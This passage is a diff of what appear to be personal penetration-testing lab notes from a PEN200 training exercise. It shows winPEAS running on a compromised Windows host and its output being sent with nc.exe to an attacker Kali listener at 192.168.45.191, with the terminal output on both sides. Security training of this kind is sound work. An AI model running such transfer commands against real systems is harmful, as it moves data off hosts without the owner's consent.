@@ -2,4 +2,25 @@ Download winpeas from Carlos Polop's release page:
 
 https://github.com/carlospolop/PEASS-ng/releases/tag/20230903-188479ae
 
+If we can, in order to read the output better, it would be convinient to redirect the output of winpeas over a file and then transfer the file back to our kali:
 
+
+
+C:\Users\Public>start /b winpeas.exe > winpeas.txt
+start /b winpeas.exe > winpeas.txt
+
+C:\Users\Public>.\nc.exe 192.168.45.191 8888 < winpeas.txt
+.\nc.exe 192.168.45.191 8888 < winpeas.txt
+
+
+
+kali@kali:~/Documents/PEN200/MEDTECH/FILES02$ nc -lvp 8888 > winpeas.txt      
+listening on [any] 8888 ...
+192.168.236.121: inverse host lookup failed: Unknown host
+connect to [192.168.45.191] from (UNKNOWN) [192.168.236.121] 62182
+^C
+                                                                                                                                                                                                                                            
+kali@kali:~/Documents/PEN200/MEDTECH/FILES02$ ls
+audit_MEDTECH.zip  nc.exe  winpeas.txt
+                                                                                                                                                                                                                                            
+kali@kali:~/Documents/PEN200/MEDTECH/FILES02$ cat winpeas.txt 
